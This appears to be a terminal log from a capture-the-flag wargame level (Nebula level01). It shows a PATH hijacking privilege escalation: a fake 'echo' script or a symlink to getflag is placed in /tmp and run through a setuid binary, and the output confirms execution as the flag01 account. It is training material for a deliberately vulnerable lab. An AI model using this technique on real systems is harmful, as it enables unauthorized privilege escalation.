```
level01@nebula:/home/flag01$ cat << EOF > /tmp/echo
> #!/bin/bash
> /usr/bin/id
> EOF
level01@nebula:/home/flag01$ PATH=/tmp ./flag01
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)


level01@nebula:/home/flag01$ rm /tmp/echo
level01@nebula:/home/flag01$ ln -s /bin/getflag /tmp/echo
level01@nebula:/home/flag01$ PATH=/tmp ./flag01
You have successfully executed getflag on a target account

```
